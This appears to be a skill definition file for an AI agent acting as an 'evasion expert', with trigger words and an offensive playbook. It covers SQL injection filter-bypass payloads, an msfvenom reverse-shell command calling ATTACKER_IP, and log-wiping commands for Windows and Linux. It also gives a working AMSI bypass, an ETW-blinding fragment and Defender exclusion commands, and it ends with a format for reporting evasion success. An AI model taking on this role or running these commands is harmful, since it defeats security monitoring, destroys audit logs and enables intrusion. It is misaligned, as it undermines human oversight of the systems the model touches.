---
name: evasion-expert
description: WAF/IDS/IPS evasion, anti-virus evasion, stealth scanning, and anti-forensics. Use when bypassing filters, evading detection, or covering tracks. Triggers on "evade", "bypass", "waf", "amsi", "defender", "stealth", "obfuscate", "encode".
category: evasion
tags: evasion,waf,amsi,defender,stealth,obfuscate,encode,etw,ids,ips
---

# Evasion Expert

## Phase 1: Reconnaissance Evasion

- Slow scanning: reduced timing, randomized intervals
- Decoy scanning: spoofed source IPs, decoy hosts
- Fragmentation: split packets to evade detection
- Source port manipulation: use allowed ports (53, 80, 443)
- Idle scanning: use zombie hosts for anonymous scanning
- DNS tunneling: covert communication via DNS queries

## Phase 2: WAF/IDS Evasion

### Encoding
- URL encoding: `%27%20OR%201%3D1`
- Double URL encoding: `%2527%2520OR%25201%253D1`
- HTML encoding: `&#39; OR 1=1--`
- Unicode/UTF-8 overlong
- Hex/Char literals: `0x61646d696e` (admin), `CHAR(97,100,109,105,110)`

### Case Manipulation
- Random mixed case: `1' oR 1=1`
- Scientific notation: `1.0union select null,concat(0x3a,schema_name) from information_schema.schemata`

### Null Bytes
- `%00`, `\x00`, null terminator injection

### Comment Injection
- SQL comments: `UN/**/ION/**/SEL/**/ECT`
- HTML comments: `<!-- -->`

### Chunked Transfer
- Split requests into chunks

### HTTP/2 Manipulation
- Frame splitting, priority manipulation

### Protocol Manipulation
- Malformed requests, boundary cases
- HTTP/2 smuggling
- HPP (HTTP Parameter Pollution)

## Phase 3: Anti-Virus Evasion

### Payload Encoding
- Base64, XOR, custom encoders
- Polymorphic code: mutate payload on each execution

### Memory Execution
- Reflective DLL injection
- Process hollowing
- Fileless techniques: PowerShell, WMI, registry-based

### Compression
- UPX: `upx --best shell.exe`
- Custom packers

### MSFVenom Encoders
```bash
msfvenom -e x86/shikata_ga_nai -i 5 -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444
```

## Phase 4: Anti-Forensics

### Log Clearing
```bash
# Windows
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Linux
echo > /var/log/auth.log
echo > /var/log/syslog
history -c
```

### Timestamp Modification
- Timestomping: MACE manipulation

### Artifact Removal
- Clear temp files, browser history
- Secure deletion: overwrite files before deletion

### Memory Clearing
- Clear pagefile, RAM

## AMSI Bypass (PowerShell)
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

## ETW Blind (PowerShell)
```powershell
$p = [System.Diagnostics.Process]::GetCurrentProcess()
$s = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(4096)
$w = New-Object System.Diagnostics.Eventing.EventProvider([Guid]::NewGuid())
```

## Defender Exclusion
```powershell
Add-MpPreference -ExclusionPath C:\temp
Add-MpPreference -ExclusionProcess shell.exe
```

## Output Format

```
[EVADE] <evasion technique> against <defense>
  Result: <success/failure>
  Detection risk: <low/medium/high>
```
